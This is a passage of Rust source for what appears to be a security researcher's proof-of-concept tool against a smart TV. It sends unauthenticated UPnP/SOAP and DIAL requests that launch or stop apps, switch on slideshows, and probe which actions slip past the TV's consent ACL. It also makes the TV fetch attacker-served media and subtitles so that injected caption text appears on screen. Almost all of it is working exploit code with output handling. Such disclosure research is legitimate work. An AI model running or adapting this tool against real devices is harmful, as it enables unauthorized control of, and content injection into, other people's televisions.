                if !send.is_empty() {
                    let raw = send.replace("\\r", "\r").replace("\\n", "\n");
                    let _ = s.write_all(raw.as_bytes());
                    let _ = s.flush();
                    println!("    sent {} bytes", raw.len());
                }
                let mut buf = [0u8; 1024];
                match s.read(&mut buf) {
                    Ok(0) => println!("    peer closed without sending anything"),
                    Ok(n) => {
                        let txt: String = buf[..n].iter()
                            .map(|&b| if (0x20..0x7f).contains(&b) { b as char } else { '.' })
                            .collect();
                        print!("    hex:");
                        for b in &buf[..n.min(48)] { print!(" {b:02x}"); }
                        println!("\n    txt: {txt}");
                        println!("    ({n} bytes)");
                    }
                    Err(e) => println!("    connected, but nothing arrived: {e}"),
                }
            }
            Err(e) => println!("    connect failed: {e}"),
        }
        return;
    }

    // --dial: DIAL on port 8080 is a completely separate service from the DLNA
    // renderer on 9197, and it is NOT behind dmr's ACL: `GET /ws/app/<App>`
    // answers 200 with the app state to anyone, while every path on the msf
    // server (8001) answers 401 because that one wants a token. Per the DIAL
    // spec, POST to the same URL launches the app and the body is handed to it
    // as its launch parameters (YouTube takes `v=<id>`); DELETE on <App>/run
    // stops it, which the TV advertises with allowStop="true".
    if args.has("--dial") {
        let app = args.val("--dial").unwrap_or_else(|| "YouTube".to_string());
        let port: u16 = args.val("--dial-port").and_then(|v| v.parse().ok()).unwrap_or(8080);
        let base = format!("http://{tv_ip}:{port}/ws/app/{app}");

        let state = |label: &str| {
            match http_request("GET", &base, &[], b"") {
                Ok((c, b)) => println!(
                    "{label} GET  {app} -> HTTP {c}  state={:?} version={:?}",
                    tag(&b, "state").unwrap_or("-"),
                    tag(&b, "version").unwrap_or("-")
                ),
                Err(e) => println!("{label} GET  {app} -> {e}"),
            }
        };

        println!("=== DIAL on {tv_ip}:{port} (no token, no ACL, no on-screen prompt) ===");
        state("[1]");

        if args.has("--dial-stop") {
            let url = format!("{base}/run");
            match http_request("DELETE", &url, &[], b"") {
                Ok((c, _)) => println!("[2] DELETE {app}/run -> HTTP {c}{}",
                                       if c == 200 || c == 204 { "  STOPPED" } else { "" }),
                Err(e) => println!("[2] DELETE {app}/run -> {e}"),
            }
        } else {
            // text/plain matters: busybox wget sends x-www-form-urlencoded and the
            // TV answers 400 to that.
            let arg = args.val("--dial-arg").unwrap_or_default();
            match http_request("POST", &base,
                               &[("Content-Type", "text/plain; charset=utf-8")],
                               arg.as_bytes()) {
                Ok((c, b)) => {
                    println!(
                        "[2] POST {app} (body {:?}) -> HTTP {c}{}",
                        arg,
                        if c == 201 { "  LAUNCHED - look at the screen" } else { "" }
                    );
                    if c != 201 && !b.is_empty() {
                        println!("    {}", &b[..b.len().min(200)]);
                    }
                }
                Err(e) => println!("[2] POST {app} -> {e}"),
            }
        }

        thread::sleep(Duration::from_secs(3));
        state("[3]");
        return;
    }

    // --slideshow: X_SetTVSlideShow lives on RenderingControl, not AVTransport
    // (RCSImpl::aX_SetTVSlideShow), and it is gated by DMRAcl::getAclPolicy,
    // which lets an unknown MAC through - unlike Play, whose askAclPolicy raises
    // the consent dialog. So this is a way to put something on the screen from an
    // identity the TV has never approved. SCPD args, read out of dmr's embedded
    // service description: InstanceID, CurrentShowState (bool), CurrentShowTheme
    // (uint) - the types come from aX_SetTVSlideShow(UpnpAction&, int, bool, uint).
    if args.has("--slideshow") {
        let on = args.val("--slideshow").map(|v| v != "off" && v != "0").unwrap_or(true);
        let theme: u32 = args.val("--theme").and_then(|v| v.parse().ok()).unwrap_or(0);
        println!("=== X_SetTVSlideShow via RenderingControl (unknown MAC is not gated here) ===");

        let (c, raw) = tv.rc("X_GetTVSlideShow", "");
        println!(
            "[1] X_GetTVSlideShow -> HTTP {c}   state={:?} theme={:?}",
            tag(&raw, "CurrentShowState").unwrap_or("-"),
            tag(&raw, "CurrentShowTheme").unwrap_or("-")
        );

        let (c, raw) = tv.rc(
            "X_SetTVSlideShow",
            &format!(
                "<CurrentShowState>{}</CurrentShowState><CurrentShowTheme>{theme}</CurrentShowTheme>",
                if on { 1 } else { 0 }
            ),
        );
        println!(
            "[2] X_SetTVSlideShow({}) -> HTTP {c}   {}",
            if on { "ON" } else { "OFF" },
            if c == 200 {
                "ACCEPTED - look at the screen".to_string()
            } else {
                format!("UPnPError {} / {}",
                        tag(&raw, "errorCode").unwrap_or("?"),
                        tag(&raw, "errorDescription").unwrap_or("?"))
            }
        );

        thread::sleep(Duration::from_secs(2));
        let (c, raw) = tv.rc("X_GetTVSlideShow", "");
        println!(
            "[3] X_GetTVSlideShow -> HTTP {c}   state={:?} theme={:?}",
            tag(&raw, "CurrentShowState").unwrap_or("-"),
            tag(&raw, "CurrentShowTheme").unwrap_or("-")
        );
        return;
    }

    if args.has("--status") {
        let (st, sts, pos) = tv.transport();
        println!("=== read-only status of {tv_ip} ===");
        println!("  transport -> state={st}  status={sts}  pos={pos}");
        let (code, raw) = tv.rc("X_GetCaptionState", "");
        println!(
            "  X_GetCaptionState -> HTTP {code}  Captions={:?}  Enabled={:?}",
            tag(&raw, "Captions").unwrap_or("").trim(),
            tag(&raw, "EnabledCaptions").unwrap_or("").trim()
        );
        return;
    }

    let ip = match my_ip(&tv_ip) {
        Ok(v) => v,
        Err(e) => {
            eprintln!("cannot determine our address towards {tv_ip}: {e}");
            std::process::exit(1);
        }
    };
    let media_uri_local = format!("http://{ip}:{port}/media.mp4");
    let cap_uri = format!("http://{ip}:{port}/poc.srt");

    if args.has("--stop") {
        let (c1, _) = tv.rc(
            "X_ControlCaption",
            &format!(
                "<Operation>Disable</Operation><Name>poc.srt</Name>\
<ResourceURI>{}</ResourceURI><CaptionURI>{}</CaptionURI>\
<CaptionType>srt</CaptionType><Language>eng</Language><Encoding>UTF-8</Encoding>",
                xesc(&media_uri_local),
                xesc(&cap_uri)
            ),
        );
        println!("[x] X_ControlCaption(Disable) -> HTTP {c1}");
        let (c2, _) = tv.av("Stop", "");
        println!("[x] Stop -> HTTP {c2}");
        return;
    }

    // clip metadata: without res@duration the renderer reports TrackDuration 0
    let clip = clip_info(&media);
    let (res_attrs, dur_ms) = match &clip {
        Some(c) => (
            format!(
                " size=\"{}\" duration=\"{}\" bitrate=\"{}\"{}",
                c.size,
                didl_duration(c.duration),
                (c.size as f64 / c.duration) as u64,
                if c.width > 0 {
                    format!(" resolution=\"{}x{}\"", c.width, c.height)
                } else {
                    String::new()
                }
            ),
            (c.duration * 1000.0) as u64,
        ),
        None => (String::new(), 0),
    };

    let captions_on = !args.has("--no-caption") && !args.has("--remote");
    let sh = Arc::new(Shared {
        media: media.clone(),
        caption_url: cap_uri.clone(),
        duration_ms: dur_ms,
        captions_on,
        hits: Mutex::new(Vec::new()),
        served: Mutex::new(0),
        accepted: AtomicUsize::new(0),
        open: AtomicUsize::new(0),
        start: Instant::now(),
    });

    println!("=== Unauthenticated DLNA caption-injection PoC vs {tv_ip} (no auth header) ===");
    println!("    media   {media_uri_local}   <- {media}");
    println!("    caption {cap_uri}   text = 'www microsoft'");
    if let Some(c) = &clip {
        println!(
            "    clip    {:.1}s @ {:.2} Mbit/s  {}x{}",
            c.duration,
            c.size as f64 * 8.0 / c.duration / 1e6,
            c.width,
            c.height
        );
        println!("    res    {}", res_attrs.trim());
    } else {
        println!("    clip    (no mvhd in the first 2 MB - is the file faststart?)");
    }

    // listener
    let listener = match TcpListener::bind(("0.0.0.0", port)) {
        Ok(l) => l,
        Err(e) => {
            eprintln!("bind 0.0.0.0:{port} failed: {e}");
            std::process::exit(1);
        }
    };
    println!("[0] HTTP listener up on 0.0.0.0:{port} (Range-capable)");
    {
        let sh = Arc::clone(&sh);
        thread::Builder::new()
            .name("http".into())
            .stack_size(THREAD_STACK)
            .spawn(move || {
                for c in listener.incoming() {
                    match c {
                        Ok(stream) => {
                            let sh = Arc::clone(&sh);
                            let _ = thread::Builder::new()
                                .stack_size(THREAD_STACK)
                                .spawn(move || handle(stream, sh));
                        }
                        Err(_) => continue,
                    }
                }
            })
            .expect("spawn http thread");
    }

    // where the TV should fetch from
    let media_uri = if args.has("--remote") {
        let u = args.val("--remote").unwrap_or_else(|| REMOTE_SAMPLE.to_string());
        println!("    [PARTITION] remote media, local server bypassed:\n      {u}");
        u
    } else {
        media_uri_local.clone()
    };
    let meta = didl(
        &media_uri,
        if captions_on { Some(cap_uri.as_str()) } else { None },
        if args.has("--remote") { "" } else { &res_attrs },
    );

    // The DLNA service goes cold when the TV is idle: the first control exchange
    // after that returns HTTP 0 (the TV is not answering ARP/SYN yet) but wakes
    // the service, so the next succeeds. Do that throwaway exchange here so the
    // real sequence below always lands on a warm service instead of losing its
    // Stop. When the TV is already warm the first probe returns 200 and this
    // costs nothing.
    for i in 1..=5 {
        let (c, _) = tv.av("GetTransportInfo", "");
        if c != 0 {
            if i > 1 {
                println!("[0a] DLNA service woke after {i} probe(s)");
            }
            break;
        }
        if i == 5 {
            println!("[0a] TV did not answer 5 probes - likely deep standby (screen fully off)");
        } else {
            println!("[0a] warming up DLNA service (probe {i}/5, TV idle)...");
            thread::sleep(Duration::from_millis(700));
        }
    }

    // Clear any stale session: a previous run leaves the renderer STOPPED with the
    // old TrackURI loaded, and control points are expected to Stop first.
    let (c, _) = tv.av("Stop", "");
    println!("[0b] Stop (clear stale session) -> HTTP {c}");
    thread::sleep(Duration::from_secs(1));

    let (c, raw) = tv.av(
        "SetAVTransportURI",
        &format!(
            "<CurrentURI>{}</CurrentURI><CurrentURIMetaData>{}</CurrentURIMetaData>",
            xesc(&media_uri),
            xesc(&meta)
        ),
    );
    println!(
        "[1] SetAVTransportURI (+sec:CaptionInfoEx) -> HTTP {c}{}",
        if c == 200 { "  OK".to_string() } else { format!("\n    {}", &raw[..raw.len().min(300)]) }
    );

    // --probe: which AVTransport actions are actually ACL-gated?
    //
    // dmr's aPlay calls DMRAcl::askAclPolicy -> rdm_request_access, which puts a
    // consent dialog on screen and records a DENY when it times out; that is why
    // Play answers 705 "Transport is locked" (log line "DMR_ACL_DENY") for every
    // controller we have used. DMRAcl::getAclPolicy, though, checks the action
    // name against a list and falls through to "permited - action not included
    // into checking list" -> allowed. So an action outside that list is served
    // without consent. Fire each candidate and read the code: 705 means the ACL
    // refused, while 402/501/500-with-another-code means it got past the ACL and
    // only the arguments or the state were wrong.
    if args.has("--probe") {
        println!("[2] probing which actions the ACL gates (705 = denied, other = passed ACL)");
        let probes: [(&str, &str); 9] = [
            ("Play", "<Speed>1</Speed>"),
            ("Next", ""),
            ("Previous", ""),
            ("Seek", "<Unit>REL_TIME</Unit><Target>0:00:03</Target>"),
            ("Pause", ""),
            ("SetPlayMode", "<NewPlayMode>NORMAL</NewPlayMode>"),
            ("X_PrefetchURI", &""),
            ("X_PlayerAppHint", "<PlayerAppHint>1</PlayerAppHint>"),
            // X_SetTVSlideShow is a RenderingControl action; asking AVTransport for
            // it only ever answers 401 "Invalid Action". See --slideshow.
            ("X_GetTVSlideShow", ""),
        ];
        for (action, inner) in probes {
            let (c, raw) = if action.starts_with("X_GetTVSlideShow") {
                tv.rc(action, inner)
            } else {
                tv.av(action, inner)
            };
            let code = tag(&raw, "errorCode").unwrap_or("-");
            let desc = tag(&raw, "errorDescription").unwrap_or("");
            println!(
                "    {action:<22} HTTP {c:<4} upnp={code:<5} {desc}{}",
                if code == "705" { "   <- ACL DENIED" } else if c == 200 { "   <- ACCEPTED" } else { "   <- past the ACL" }
            );
            thread::sleep(Duration::from_millis(400));
        }
        println!("\nAny line that is not 705 reached the handler, i.e. the ACL did not gate it.");
        return;
    }

    let (c, raw) = tv.av("Play", "<Speed>1</Speed>");
    println!(
        "[2] Play -> HTTP {c}{}",
        if c == 200 { "  OK".to_string() } else { format!("\n    {}", &raw[..raw.len().min(300)]) }
    );

    // Polling costs the renderer two fresh TCP connections per call, which is a
    // lot for a constrained device that is also pulling the stream. --nopoll
    // leaves it alone and checks once at the end.
    let watch = |secs: u64, label: &str| {
        if args.has("--nopoll") {
            println!("[.] {label}: NOT polling (leaving the TV alone for {secs}s)");
            thread::sleep(Duration::from_secs(secs));
            let (st, sts, pos) = tv.transport();
            println!("    {} state={st}  status={sts}  pos={pos}   (single check)", sh.ts());
        } else {
            println!("[.] {label}: polling transport for {secs}s");
            let mut last = String::new();
            for _ in 0..secs {
                let (st, sts, pos) = tv.transport();
                let cur = format!("{st}/{sts}");
                if cur != last {
                    println!("    {} state={st}  status={sts}  pos={pos}", sh.ts());
                    last = cur;
                }
                thread::sleep(Duration::from_secs(1));
            }
        }
    };

    watch(15, "after Play");

    if args.has("--ctrl-caption") {
        let (c, _) = tv.rc(
            "X_ControlCaption",
            &format!(
                "<Operation>Enable</Operation><Name>poc.srt</Name>\
<ResourceURI>{}</ResourceURI><CaptionURI>{}</CaptionURI>\
<CaptionType>srt</CaptionType><Language>eng</Language><Encoding>UTF-8</Encoding>",
                xesc(&media_uri),
                xesc(&cap_uri)
            ),
        );
        println!("\n[4] X_ControlCaption(Enable) during playback -> HTTP {c}");
    } else {
        println!(
            "\n[4] X_ControlCaption skipped (caption already bound via DIDL; \
             pass --ctrl-caption to exercise it)"
        );
    }

    watch(30, "WATCH THE SCREEN for 'www microsoft'");

    println!("\n=== RESULT ===");
    let hits = sh.hits.lock().map(|h| h.clone()).unwrap_or_default();
    let subs = hits.iter().filter(|h| h.as_str() == "srt").count();
    let med = hits.len() - subs;
    println!("media fetches: {med}   subtitle fetches: {subs}");
    if let Some(c) = &clip {
        let mb = *sh.served.lock().unwrap_or_else(|e| e.into_inner()) as f64 / 1e6;
        println!(
            "clip: {:.1}s, {:.1} MB total; we served {:.1} MB ({:.0}% of the file)",
            c.duration,
            c.size as f64 / 1e6,
            mb,
            mb / (c.size as f64 / 1e6) * 100.0
        );
    }
    if subs > 0 {
        println!(
            "\nPROVEN: an unauthenticated SOAP call made the TV fetch BOTH attacker-supplied\n\
             URLs (media + subtitle) - arbitrary outbound fetch / content delivery, no auth.\n\
             NOT proven by the network log alone: that the caption actually RENDERED."
        );
    } else if med > 0 {
        println!("\nPARTIAL: the TV fetched our media but never the subtitle.");
    } else {
        println!("\nNo fetch at all - is the port reachable from the TV?");
    }
    println!("\nrun with --stop to stop playback + disable the caption");
}
